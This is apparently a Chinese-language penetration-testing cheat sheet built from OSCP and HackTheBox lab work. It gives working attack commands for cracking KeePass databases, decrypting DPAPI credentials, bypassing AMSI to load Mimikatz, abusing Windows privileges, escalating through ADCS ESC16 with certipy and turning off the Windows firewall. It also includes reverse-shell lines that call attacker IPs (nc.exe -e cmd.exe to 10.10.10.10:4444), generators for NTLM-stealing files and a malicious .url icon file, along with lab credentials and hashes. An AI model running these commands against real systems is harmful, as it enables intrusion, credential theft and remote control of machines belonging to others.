[mod0keecrack](https://github.com/devio/mod0keecrack)编译命令如下，建议使用旧版的MSVC编译！

```
cl.exe /Femod0keecrack.exe helper.c mod0keecrack.c crypto-ms.c bcrypt.lib
```

推荐keepass爆破字典：https://github.com/wevans311082/PoshKPBrute



# KeePassXC

[KeePassXC](https://github.com/keepassxreboot/keepassxc/releases/download/2.7.9/KeePassXC-2.7.9-Win64.msi)导出的.kdbx文件，目前keepass2john、hashcat、mod0keecrack工具都不支持转储hash爆破攻击。

在线查看keepass文件网站：https://app.keeweb.info

## 爆破KDBX 4.x 格式密码

keepass4brute可以实现KDBX 4.x 格式（Keepass >=2.36）批量密码爆破，而目前还没有已知的方法从KDBX 4.x来提取哈希并破解，所以该工具依赖keepassxc-cli。注意该工具爆破速度过快会有bug，速度与字典大小有关，越小越快，但越不准确。

在线查看rockyou字典网站：https://www.kaggle.com/datasets/wjburns/common-password-list-rockyoutxt

安装依赖

``` bash
sudo apt install keepassxc
```

安装keepass4brute

```
git clone https://github.com/r3nt0n/keepass4brute.git
```



# Apt

apt默认使用ipv6下载包，强制使用ipv4的命令如下，但是一般不推荐，容易找不到包而出错。

```
sudo apt -o Acquire::ForceIPv4=true update
```

强制使用ipv4下载包出错情况如下，

```bash
┌──(kali㉿kali)-[~/HackTheBox/Puppy]
└─$ sudo apt -o Acquire::ForceIPv4=true install keepassxc
The following packages were automatically installed and are no longer required:
libpython3.12-dev python3.12 python3.12-dev python3.12-minimal python3.12-venv
Use 'sudo apt autoremove' to remove them.

Upgrading:
icu-devtools libqt5core5t64 libqt5network5t64 libqt5sql5-sqlite libqt5widgets5t64 libxtst6
libicu-dev libqt5dbus5t64 libqt5opengl5t64 libqt5sql5t64 libqt5xml5t64 qt5-gtk-platformtheme
libpng16-16t64 libqt5gui5t64 libqt5printsupport5t64 libqt5test5t64 libxcb-keysyms1 qtbase5-dev-tools

Installing:
keepassxc

Installing dependencies:
keepassxc-full libbotan-2-19 libicu76 libqt5concurrent5t64 libtspi1 libzxcvbn0

Suggested packages:
webext-keepassxc-browser xclip

Summary:
Upgrading: 18, Installing: 7, Removing: 0, Not Upgrading: 1765
Download size: 41.5 MB / 42.6 MB
Space needed: 82.0 MB / 51.6 GB available

Continue? [Y/n] Y
Get:8 http://mirrors.ustc.edu.cn/kali kali-rolling/main amd64 libpng16-16t64 amd64 1.6.48-1 [282 kB]
Get:1 http://mirror.techlabs.co.kr/kali kali-rolling/main amd64 libicu76 amd64 76.1-3 [9,721 kB]
Get:4 http://http.kali.org/kali kali-rolling/main amd64 libbotan-2-19 amd64 2.19.5+dfsg-4 [1,739 kB]
Err:3 http://mirror.twds.com.tw/kali kali-rolling/main amd64 icu-devtools amd64 76.1-3
Connection failed [IP: 103.147.22.36 80]
Err:9 http://http.kali.org/kali kali-rolling/main amd64 libqt5network5t64 amd64 5.15.15+dfsg-5
Could not connect to mirror.twds.com.tw:80 (103.147.22.36), connection timed out [IP: 103.147.22.36 80]
Err:11 http://http.kali.org/kali kali-rolling/main amd64 libqt5widgets5t64 amd64 5.15.15+dfsg-5
Unable to connect to mirror.twds.com.tw:http: [IP: 103.147.22.36 80]
Err:18 http://http.kali.org/kali kali-rolling/main amd64 libqt5test5t64 amd64 5.15.15+dfsg-5
Unable to connect to mirror.twds.com.tw:http: [IP: 103.147.22.36 80]
Fetched 38.1 MB in 1min 10s (544 kB/s)
Error: Failed to fetch http://mirror.twds.com.tw/kali/pool/main/i/icu/icu-devtools_76.1-3_amd64.deb Connection failed [IP: 103.147.22.36 80]
Error: Failed to fetch http://mirror.twds.com.tw/kali/pool/main/q/qtbase-opensource-src/libqt5network5t64_5.15.15+dfsg-5_amd64.deb Could not connect to mirror.twds.com.tw:80 (103.147.22.36), connection timed out [IP: 103.147.22.36 80]
Error: Failed to fetch http://mirror.twds.com.tw/kali/pool/main/q/qtbase-opensource-src/libqt5widgets5t64_5.15.15+dfsg-5_amd64.deb Unable to connect to mirror.twds.com.tw:http: [IP: 103.147.22.36 80]
Error: Failed to fetch http://mirror.twds.com.tw/kali/pool/main/q/qtbase-opensource-src/libqt5test5t64_5.15.15+dfsg-5_amd64.deb Unable to connect to mirror.twds.com.tw:http: [IP: 103.147.22.36 80]
Error: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?
```



# DPAPI

**DPAPI（Data Protection API）** 是 Windows 提供的一个核心加密接口，专门用于**保护敏感数据**（如密码、密钥、凭据等）。它被广泛用于系统后台，用户通常不会直接接触。

DPAPI 保护的个人数据包括：

```
1、Internet Explorer 和 Google Chrome 的密码和自动完成数据。
2、共享文件夹、资源、无线网络和 Windows Vault 的密码，包括加密密钥。
3、远程桌面连接密码、.NET Passport 以及用于各种加密和身份验证目的的私钥。
4、由Credential Manager管理的网络密码和使用CryptProtectData的应用程序中（例如 Skype、MSN messenger 等）的个人数据。
5、寄存器内的加密 blob。
```

DPAPI 保护的系统数据包括：

```
Wifi passwords  无线网络密码
Scheduled task passwords 计划任务密码
```

主密钥文件一般在\Protect目录下，存储凭据的文件一般在\Credentials下，C:\Users\username\AppData\Roaming可以用APPDATA表示，使用set命令可查看环境变量。

```
C:\Users\username\AppData\Roaming\Microsoft\Protect\*
C:\Users\username\AppData\Roaming\Microsoft\Credentials\*
C:\Users\username\AppData\Roaming\Microsoft\Vault\*
C:\Users\username\AppData\Local\Microsoft\Protect\*
C:\Users\username\AppData\Local\Microsoft\Credentials\*
C:\Users\username\AppData\Local\Microsoft\Vault\*
```

枚举存储凭据的文件。

```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

DPAPI渗透基础利用流程：

```
1、找到主密钥文件、存储凭据的文件、SID（一般是存储主密钥文件目录的名称）

2、下载到kali本地

3、使用impacket-dpapi破解出主密钥文件的Key
impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'

4、利用key解密存储凭据的文件
impacket-dpapi credential -file "C8D69EBE9A43E9DEBF6B5FBD48B521B9" -key "0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84"
```

DPAPI 加密的 blob 通常以 `01000000`（存在于您的数据中）开头，这是 DPAPI 加密数据的签名，表明数据已使用用户或机器的安全上下文进行加密。

```powershell
# 解密DPAPI加密的blob
$pw = Get-Content enc | ConvertTo-SecureString
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)
$unsecuredpassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
$unsecuredpassword
```



# Evil-WinRM

## 登录命令

```
# hash登录
evil-winrm -i dc01.fluffy.htb -u 'administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e

# 密码登录
evil-winrm -i dc01.tombwatcher.htb -u 'john' -p 'P@ssw0rd456!'
```

## 往事回忆：download命令下载文件失败

使用evil-winrm的download命令下载windows目录下的隐藏文件，结果失败了！只能使用powershell命令强制去掉文件的隐藏属性，**并且cd到目标文件的目录下**，然后再使用download命令才成功下载到kali本地。

当前目标文件目录下的文件全部强制去掉隐藏属性：

```
Get-ChildItem -Force | ForEach-Object {attrib -H -S $_.FullName}
```

指定目录D:\Data下的文件全部强制去掉隐藏属性：

```
Get-ChildItem -Path "D:\Data" -Recurse -Force | % { $_.Attributes = $_.Attributes -band -bnot [System.IO.FileAttributes]::Hidden }
```

## AMSI

Evil-winrm 提供了一项功能，允许我们使用主机上的脚本。我们可以使用 **-s** 标志以及本地机器上存储脚本的脚本文件路径，将脚本直接加载到内存中。此外，它还提供了 AMSI 功能，我们在导入任何脚本之前通常都需要这项功能。下面的命令实现绕过 AMSI，直接从系统调用 Invoke-Mimiktz.ps1 脚本到目标机器并将其加载到内存中。

```bash
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz
```



# Actuator

`Actuator`是`Spring Boot`提供的应用系统监控的开源框架。在攻防场景里经常会遇到`Actuator`配置不当的情况，攻击者可以直接下载heapdump堆转储文件，然后通过一些工具（例如[heapdump_tool](https://github.com/wyzxxz/heapdump_tool)）来分析`heapdump`文件，从而可进一步获取敏感信息。

`Spring Boot Actuator` 模块提供了生产级别的功能，比如健康检查，审计，指标收集，`HTTP `跟踪等，帮助监控和管理`Spring Boot` 应用。这个模块是一个采集应用内部信息暴露给外部的模块，上述的功能都可以通过HTTP 和 JMX 访问。

env和configprops路径一般会泄露用户凭据或生产数据，不过有时候敏感数据可能会被和谐，用*符号代替。

```
/actuator/configprops # 显示所有@ConfigurationProperties
/actuator/env # 公开 Spring 的ConfigurableEnvironment
/actuator/health # 显示应用程序运行状况信息
/actuator/httptrace # 显示 HTTP 跟踪信息
/actuator/metrics # 显示当前应用程序的监控指标信息。
/actuator/mappings # 显示所有@RequestMapping路径的整理列表
/actuator/threaddump # 线程转储
/actuator/heapdump # 堆转储
/actuator/jolokia # JMX-HTTP桥,它提供了一种访问JMX beans的替代方法
```

 

# SSH

## 本地端口转发

学习SSH隧道技术链接：

https://harttle.land/2022/05/02/ssh-port-forwarding.html

情况：kali监听1234端口，一旦在kali或通过kali访问1234端口，就会将流量转发至目标服务器在127.0.0.1地址下监听的端口631。

前提：远程主机的 SSH 服务需允许端口转发，默认开启，检查 `/etc/ssh/sshd_config` 中的 `AllowTcpForwarding yes`和`GatewayPorts yes`，如果需要长时间保持连接，那么还需要开启`TCPKeepAlive yes`。

```bash
# 密码认证
kali: ssh -f -N -L 1234:127.0.0.1:631 user@192.168.132.130

# 私钥认证
kali: ssh -f -N -L 1234:127.0.0.1:631 user@192.168.132.130 -i ~/.ssh/id_rsa

-L : 本地转发，将本地端口映射到远程主机的目标端口。
-N : 不执行远程命令（仅建立隧道，不打开 shell）。
-f : 后台运行，默认情况下，SSH 隧道会随终端关闭而断开。
```

## 远程端口转发

情况：远程服务器会监听8080端口，一旦访问端口8080，流量会通过 SSH 隧道转发到kali的127.0.0.1:3000。

前提：远程主机的 SSH 服务需允许端口转发，默认开启，检查 `/etc/ssh/sshd_config` 中的 `AllowTcpForwarding yes`和`GatewayPorts yes`，如果需要长时间保持连接，那么还需要开启`TCPKeepAlive yes`。

```bash
# 全网可访问8080
kali: ssh -f -N -R 8080:127.0.0.1:3000 user@example.com

# 仅远程服务器本地能访问8080
kali: ssh -f -N -R localhost:8080:127.0.0.1:3000 user@example.com

-R : 远程转发，将远程主机的端口映射到本地的目标端口。
```

## Socks代理

情况：kali监听1080端口，使用代理命令或工具连接1080端口即可使用socks代理访问。

```bash
# 明文密码认证（需要安装第三方包sshpass）
kali: sshpass -p 'your_password' ssh -D 1080 -f -N -C user@remote_server

-C : 启用压缩（可选，加快传输速度）。
-D : 动态转发，创建 SOCKS 代理（适用于全局流量转发）。
```

## TCPKeepAlive

`TCPKeepAlive` 运行在 TCP 层，通过发一个空包来保持连接。如果你的服务器有复杂的防火墙，或者本地所在的网络运营商比较奇怪，这个包可能会被丢掉。这时可以用 `ServerAliveInterval 60` 来在 SSH 协议一层保持连接。方便起见这些参数可以在建立连接时指定。

```bash
ssh -L 8080:localhost:33062 harttle@mysql.example.com -o TCPKeepAlive=true ServerAliveInterval=60
```

也可以装一个 autossh 包，让它来托管 ssh 服务，这样会更稳定。

```
autossh -NR 8080:localhost:32400 harttle@example.com
```

## 开机自动建立隧道

一般用于权限维持，属于后门技术。

### Windows

```

```

### Linux

学习systemd 脚本链接：

https://harttle.land/2016/08/04/systemd-nodejs-app.html

```

```

## Windows Terminal 稳健使用SSH

在用户主目录.ssh中修改或者创建config文件

```
Host *
    ServerAliveInterval 30   # 每30秒发送一次心跳包
    ServerAliveCountMax 3    # 连续3次无响应才断开
    TCPKeepAlive yes         # 启用 TCP 保活机制
```



# Google

Google搜索默认范围是全部，有时候还会触发AI概览，这样不利于OSCP考试。当然，如果使用Google Hacking 就没有这档子破事了！

解决方法一：使用下面的URL搜索

```
https://www.google.com/search?as_q=关键词&udm=14
```

解决方法二：自定义搜索引擎

打开浏览器设置 → 搜索引擎 → 管理搜索引擎，添加新的搜索引擎，设置关键字`go`，在地址栏输入 `go 关键词` 直接触发网页搜索。

```
https://www.google.com/search?as_q=%s&udm=14
```

**Google搜索Windows特权利用方式的关键字如下：**

```
escalation via SeManageVolumePrivilege
SeMachineAccountPrivilege exploit
```

**Google搜索如何生成带有恶意odt文件方法的关键字如下：**

```
# 嵌入恶意宏代码
how to generate malicious odt file

# 窃取hash
via malicious ODT Files Theft NTLM Credential
```

**Google搜索陌生端口信息的关键字如下：**

```
# 陌生端口3389
default port 3389

# 专门搜索陌生端口的网站
https://www.speedguide.net/port.php?port=3389
```

**Google搜索默认凭据的关键字如下：**

```
default credentials
default password
default pass
default admin
```

**Google搜索web应用渗透方法的关键字如下：**

```
# 以代理应用Squid Proxy为例
Squid Proxy Pentesting
Squid exploit
HackTricks Squid
default port 3128 exploit

# 以phpmyadmin为例
get shell from phpmyadmin
```

**Google搜索windows服务账户提权的关键字如下：**

```
"nt authority\local service" privilege escalation
```



# GCC

## 往事回忆：你应该退学！-- 达康编译器

### 构建.so文件

以下C代码为例：

```c
#include <stdio.h>
void hello()
{
    printf("Hello world!\n");
}
```

要生成共享库，首先需要使用 `-fPIC` （位置无关代码）标志编译 C 代码。

```bash
gcc -c -fPIC hello.c -o hello.o
```

然后生成一个目标文件（.o），利用它并创建.so 文件。

```bash
gcc hello.o -shared -o libhello.so
```

也一步完成，建议在 `gcc` 命令中添加 `-Wall` 以获取所有警告，以及 `-g` 以获取调试信息

```bash
gcc -shared -o libhello.so -fPIC hello.c -wall -g
```



# SQLi Payload

https://github.com/payloadbox/sql-injection-payload-list

https://cheatsheet.haax.fr/web-pentest/injections/server-side-injections/sql/



# SpoolFool

[CVE-2022-21999](https://github.com/ly4k/SpoolFool) 漏洞利用 ， Windows 打印后台处理程序特权提升漏洞 (LPE)。这个漏洞在2022年发布，补丁包只对应2022年以前发行的系统版本，之后发行的已经集成到内核。



# Gost

GO Simple Tunnel ， 用 golang 编写的简单隧道。

https://github.com/ginuerzh/gost

https://github.com/KANIKIG/Multi-EasyGost



# Gobuster

```
sudo gobuster dir -w '/home/kali/Desktop/wordlists/dirbuster/directory-list-2.3-medium.txt' -u http://192.168.132.167:80 -t 42 -b 400,404

sudo gobuster dir -u http://192.168.121.122 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,asp,aspx -t 99 > gobuster.txt

sudo gobuster dir -w '/home/kali/Desktop/wordlists/dirbuster/directory-list-2.3-medium.txt' -u http://$IP:242 -t 42 -b 404,403,400 --exclude-length 401

-x 文件后缀
-t 选择线程数量
-b 忽略状态返回码，不建议忽略401和403的目录或文件
--exclude-length 401 排除响应长度为 401 的结果（常用于过滤认证失败的固定长度页面）
```



# Nikto

简单的漏扫工具，oscp官方允许的工具。

```
nikto -h 192.168.121.122
nikto -o nikto.txt — maxtime=180s -C all -h http://192.168.106.65:80
```



# DNS

## DNS 区域传输攻击

有时 DNS 服务器会配置错误。DNS 服务器包含一个区域文件，用于复制域名映射。DNS 服务器应该配置为只有复制 DNS 服务器才能访问它，但有时 DNS 服务器配置错误，导致任何人都可以请求区域文件，从而获取完整的子域名列表。

```
# 获取wikipedia.com的名称服务器（解析wikipedia.com的dns服务器）
host -t ns wikipedia.com

# 指定ns1.wikipedia.com为ns请求区域传输
host -l wikipedia.com ns1.wikipedia.com

-l 参数用于请求 DNS 区域传输（AXFR），试图获取该域的所有DNS记录（如A、MX、CNAME等）。
```



# Dig

```
# 尝试对域名 vault.offset 执行 DNS 区域传输（AXFR）
dig @192.168.45.172 axfr vault.offset
```



# sAMAccountName Spoofing

https://www.hackingarticles.in/windows-privilege-escalation-samaccountname-spoofing/



# .htaccess

执行以下Apache 指令，可实现`.dork` 结尾的文件（如 `test.dork`）被 Apache 当作 PHP 脚本的功能，通常用于文件上传绕过。

```bash
echo "AddType application/x-httpd-php .dork" > .htaccess

AddType：Apache 指令，用于关联文件扩展名与处理类型。
application/x-httpd-php：MIME 类型，表示文件应由 PHP 解析器处理。
.dork：自定义的文件扩展名（原本不是 PHP 的默认扩展名如 .php）。
```

基于 HTTP 请求头（Header）进行访问控制，只允许特定请求头（`Special-Dev: only4dev`）的请求访问，其他请求全部拒绝。

```bash
┌──(poiint㉿Kali)-[~/…/htb/labs/updown/website]
└─$ cat .htaccess  
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header


1.SetEnvIfNoCase Special-Dev "only4dev" Required-Header
作用：检查 HTTP 请求头 Special-Dev 的值是否 不区分大小写 匹配 "only4dev"。
如果匹配，则设置环境变量 Required-Header=1（用于后续访问控制）。

2. Order Deny,Allow
作用：定义访问规则的 处理顺序（先 Deny，后 Allow）。

3. Deny from All
作用：默认 拒绝所有访问（除非后续 Allow 规则允许）。

4. Allow from env=Required-Header
作用：仅当 Required-Header 环境变量存在时（即请求头 Special-Dev: only4dev 存在），才 允许访问。
```



# Upload_Bypass

一个自动绕过文件上传限制的简单工具，但是oscp考试不支持这种自动化工具。

https://github.com/sAjibuu/Upload_Bypass



# John

John the Ripper 自动识别密文类型，支持通过规则对字典（wordlist）中的单词进行变形，许多用户会在基础密码上添加简单修改（如大小写变化、数字后缀等）。

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 MSSQL.hash 
```

best64 规则集是 John 默认提供的最常用的64条密码变形规则，覆盖了常见的密码模式，它是从 John 的完整规则库中精选出的高效规则组合。

```
将单词首字母大写（password → Password）
添加数字后缀（password → password1、password123）
符号替换（password → p@ssword）
反转字符串（password → drowssap）
……
```



# RunasCs

[RunasCs](https://github.com/antonioCoco/RunasCs/tree/master) 可使用显式凭据以不同于用户当前登录权限的权限运行特定进程。此工具是 Windows 内置 *runas.exe* 的改进版和开放版。

```
Run a command as a local user
RunasCs.exe user1 password1 "cmd /c whoami /all"

Run a command as a domain user and logon type as NetworkCleartext (8)
RunasCs.exe user1 password1 "cmd /c whoami /all" -d domain -l 8

Run a background process as a local user,
RunasCs.exe user1 password1 "C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe" -t 0

Redirect stdin, stdout and stderr of the specified command to a remote host
RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444

Run a command simulating the /netonly flag of runas.exe
RunasCs.exe user1 password1 "cmd /c whoami /all" -l 9

Run a command as an Administrator bypassing UAC
RunasCs.exe adm1 password1 "cmd /c whoami /priv" --bypass-uac

Run a command as an Administrator through remote impersonation
RunasCs.exe adm1 password1 "cmd /c echo admin > C:\Windows\admin" -l 8 --remote-impersonation

# 更多细节关注官网
```

Invoke-RunasCs.ps1用法

```
# 导入
Import-Modules .\Invoke-RunasCs.ps1

# 横向切换到域用户p.agila的环境下
Invoke-RunasCs -Domain fluffy.htb -Username p.agila -Password prometheusx-303 -Command cmd.exe -Remote 10.10.16.25:443 -LogonType 8
```



# Windows Privilege

在 Windows 系统中（包括本地和域环境），用户的特权（权限）主要通过以下方式获得：

```
1. 通过加入高权限组（主要方式）
## 本地计算机上的高权限组
Administrators：成员拥有对本地计算机的完全控制权（安装软件、修改系统配置等）。默认包含本地 Administrator 账户。
Backup Operators：一般对应SeBackupPrivilege、SeRestorePrivilege。可以绕过文件权限执行备份/还原操作。
Remote Desktop Users：允许通过 RDP 远程登录。

## 域环境（Active Directory）中的高权限组
Domain Admins：成员可以管理整个域（包括所有域成员计算机、用户、组策略等）。
Enterprise Admins：权限高于 Domain Admins，可以管理整个 AD 林（Forest）。
Account Operators：可以管理域用户和组，但不能修改高权限组（如 Domain Admins）。
Server Operators：类似于 Backup Operators，可以绕过文件权限进行备份/还原（SeBackupPrivilege + SeRestorePrivilege）。还可以管理服务，启动、停止、暂停和配置 Windows 服务（如 DHCP、DNS）。还可以管理共享文件夹，创建、删除和管理共享文件夹（如 C$, ADMIN$）。
Schema Admins：可以修改 AD 架构（Schema）。


2. 通过直接分配权限（较少使用）
## 手动配置 ACL（访问控制列表）
## 通过组策略（GPO）分配权限
```

## 特权提权参考链接

```
https://github.com/gtworek/Priv2Admin
```

## SeMachineAccountPrivilege

https://x.com/S4thv1k/status/1790797209337745753

## SeManageVolumePrivilege

特权[SeManageVolumePrivilege](https://github.com/xct/SeManageVolumeAbuse)的利用方式：当用户拥有 SeManageVolumePrivilege（允许读取/写入任何文件）时，即可完全控制 C:\。从此处获取 Shell 的一种可能方法是将自定义 dll 写入 C:\Windows\System32\wbem\tzres.dll 并调用 systeminfo 来触发该操作。

Exploit二进制程序github链接：https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public

## SeBackupPrivilege

利用reg命令dump出.hive文件

```
reg save hklm\sam C:\users\anirudh\sam.hive

reg save hklm\system C:\users\anirudh\system.hive
```

利用impacket-secretsdump提取.hive文件中的hash。注意在域控中这么做提取的是本地账户的密码hash，并非域账户的密码hash！

```
impacket-secretsdump -system system.hive -sam sam.hive LOCAL
```

如果在域控上发现这个特权而且还存在SeRestorePrivilege，请尝试转储NTDS数据库并提取域用户hash，具体参考[链接](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

## SeRestorePrivilege

此权限旨在允许用户恢复文件，更重要的是，它启用了文件权限和 ACL 检查。这可以用来将系统文件替换为其他文件，这是扩展或保留访问权限的常用技巧。

通过将 `utilman.exe` 替换为 `cmd.exe` ，我们可以从 Windows 登录屏幕访问命令提示符，而无需登录。这意味着如果我们重新启动或注销机器并在登录屏幕上按 Windows 键 + U，系统将以系统权限启动命令提示符，而不是打开实用程序管理器。

```
C:/Windows/system32/Utilman.exe
C:/Windows/System32/cmd.exe
```

或者使用二进制文件[SeRestoreAbuse.exe](https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe?source=post_page-----158516460860---------------------------------------)完成提权。

## SeImpersonate

https://support.plesk.com/hc/en-us/articles/12376963995287-Microsoft-Windows-SeImpersonatePrivilege-Local-Privilege-Escalation

- GodPotato
- Printspoofer
- Juicy-potato
- Juicy-potato-NG
- Sharpefspotato

## SeAssignPrimaryToken

- Juicy-potato
- Juicy-potato-NG



# Certipy-ad

这是一个可以帮助渗透测试人员[滥用 Active Directory 证书服务](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/)的工具，而且kali自带该工具，虽然不是最新版但依然可用！注意使用该工具可能在找证书模板漏洞方面会有误报，还是推荐使用最新版！

```bash
# 查找域用户p.agila的证书模板漏洞以及证书颁发机构。注意最新版v5.0.2的certipy不会生成BloodHound data，也就没有zip。
certipy-ad find -u "p.agila@fluffy.htb" -p "prometheusx-303" -dc-ip '10.10.11.69' -vulnerable -enabled
```



# BloodHound分支

Certipy-ad生成的 BloodHound 数据只能由[BloodHound 分支](https://github.com/ly4k/BloodHound)提取。



# Windows Firewall

```
# 查看防火墙状态
netsh advfirewall show allprofiles

# 关闭防火墙
netsh firewall set opmode mode=disable
netsh advfirewall set allprofiles state off
```



# SharpEfsPotato

https://raw.githubusercontent.com/jakobfriedl/precompiled-binaries/main/PrivilegeEscalation/Token/SharpEfsPotato.exe



# ESC16

ESC16是一种证书模板配置错误类型。

场景 A：UPN 操纵（需要 DC 上的 `StrongCertificateBindingEnforcement = 1` （兼容性）或 `0` （禁用），并且攻击者对“受害者”帐户的 UPN 具有写访问权限）

```
# 读取受害者帐户ca_svc的初始UPN，一般用于恢复。
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read

# 将受害者帐户ca_svc的UPN更新为目标管理员的 sAMAccountName
certipy account -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update

# 如果上一步需要获取受害者帐户ca_svc的凭据，则可以利用certipy的影子凭据攻击
certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
certipy shadow -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.10.11.69' -account 'ca_svc' auto

#利用certipy的影子凭据攻击获取ca_svc的票据
export KRB5CCNAME=ca_svc.ccache

# 请求administrator的证书
certipy req -k -no-pass -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User' -dc-host dc01.fluffy.htb
-ca		  : 证书颁发机构名称，使用certipy find寻找证书模板漏洞的时候就已经获取了
-template : 用户模板，默认User；计算机账户模板，默认Machine
-target	  : 需要DC的SPN，一般是dc01.fluffy.htb，否则会返回KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
-dc-host  : 尽量写DC的FQDN

# 恢复受害者帐户的 UPN
certipy account -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
    
# 以目标管理员身份进行身份验证，获得其hash。注意一定要完成上一步恢复步骤，否则这一步执行会失败！
certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
```

其他ESC提权方法参考如下链接：

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation

https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc1-template-allows-san



# Ntlm_threft

```
# 生成excel类型的攻击文件，名称homework。
python3 ntlm_theft.py -g xlsx -s 10.10.16.38 -f homework

# 生成全部类型的攻击文件，除了pptx类型。
python3 ntlm_theft.py -g modern -s 10.10.16.38 -f homework
```



# Hashgrab

生成 scf、url 和 lnk 有效负载以放在 smb 共享上。这些强制对攻击者计算机进行身份验证，以便获取哈希值（例如，使用响应方）。

```
python3 hashgrab.py <ip> <output>
```



# Zip

```
# 输出压缩文件homework.zip，里面包括所有当前目录的文件。
zip homework *

# 输出压缩文件homework.zip，里面包括当前目录的homework.xlsx和update.library-ms。
zip homework homework.xlsx update.library-ms
```



# Get-ChildItem

```
# 递归扫描 C:\Users 下的所有文件，遇到错误时不显示，继续执行
Get-ChildItem -path C:\\Users\\ -include *.* -file -recurse -erroraction silentlycontinue

-recurse : 递归查询
-File : 仅返回文件（排除目录）
-Include *.* : 指定要包含的文件或目录的名称模式（支持通配符 * 和 ?）；*.* 表示 "所有带扩展名的文件"（即 文件名.扩展名 格式的文件）。
-ErrorAction SilentlyContinue : 当命令执行过程中发生非致命错误（如权限不足、文件无法访问等）时，不会显示错误信息，并继续执行后续操作。如果不加这个参数，遇到错误时 PowerShell 默认会停止并显示错误（-ErrorAction Continue，这是默认行为）。

# 查看当前目录下所有文件和目录，包括隐藏文件
Get-ChildItem -Force
```



#  Rdesktop

```
# 即使不提供凭据也长时间停留在RDP登录界面，甚至win+u可以调用实用程序管理器
rdesktop DC.vault.offsec
rdesktop -u 'anirudh' -p 'SecureHM' -g 85% -D DC.vault.offsec
```



# RemotePotato0

https://github.com/dxnboy/redteam/blob/master/RemotePotato0.exe



# .url

将以下代码粘贴到名为"Evil.url"的文件中，这样就创建了一个windows恶意图标，一般用来窃取hash。

```
[InternetShortcut]
URL=Random_nonsense
WorkingDirectory=Flibertygibbit
IconFile=\\<YOUR tun0 IP>\%USERNAME%.icon
IconIndex=1
```



# Xfreerdp3

```
# 忽略认证，根据窗口大小自动调整分辨率，最重要的是增加剪贴板功能
xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /u:'anirudh' /p:'SecureHM' /v:vault.offsec

# 共享本地目录到远程主机（将 Kali 的 share 文件夹映射为远程的 share 驱动器）
xfreerdp3 /v:192.168.221.21 /u:Andrea.Haves /p:'Nacova2023' /dynamic-resolution /drive:/home/kali/Desktop/share,share

# 出现VPN网络问题，可尝试下列选项
sudo ifconfig tun0 mtu 1250
sudo ifconfig tun0 mtu 750
/timeout:60000
```



# GPOAbuse

GPO滥用漏洞一般可以靠bloodhound分析出来。

## Powerview

运行powerview寻找GPO滥用漏洞。

```
.\powerview.ps1

# 获取Default Domain Policy对象的uid。
Get-GPO -Name "Default Domain Policy"

# 如果返回Permission为GpoEditDeleteModifySecurity，说明当前用户对Default Domain Policy完全控制权限。
Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh
```

## SharpGPOAbuse

https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"

gpupdate /force
```

## PyGPOAbuse

https://github.com/Hackndo/pyGPOAbuse



# Domain Controller

## 搭建DC后本地Administrator的变化

在 Windows Server 上搭建域控制器（Domain Controller, DC）时，本地的 `Administrator` 账户不会自动变成域的 `Administrator`。

安装域控制器后，服务器的本地 `Administrator` 账户会保留，但它的权限会被限制（因为域控制器没有“本地用户”的概念，所有账户由域管理）。在域控制器上运行 `lusrmgr.msc`（本地用户和组管理器），你会看到本地 `Administrator` 仍然存在，但登录方式受限。你需要通过 **`.\Administrator`**（前缀 `.\` 表示本地账户）或 **`<计算机名>\Administrator`** 来登录本地管理员账户，而不再是默认的 `Administrator`。

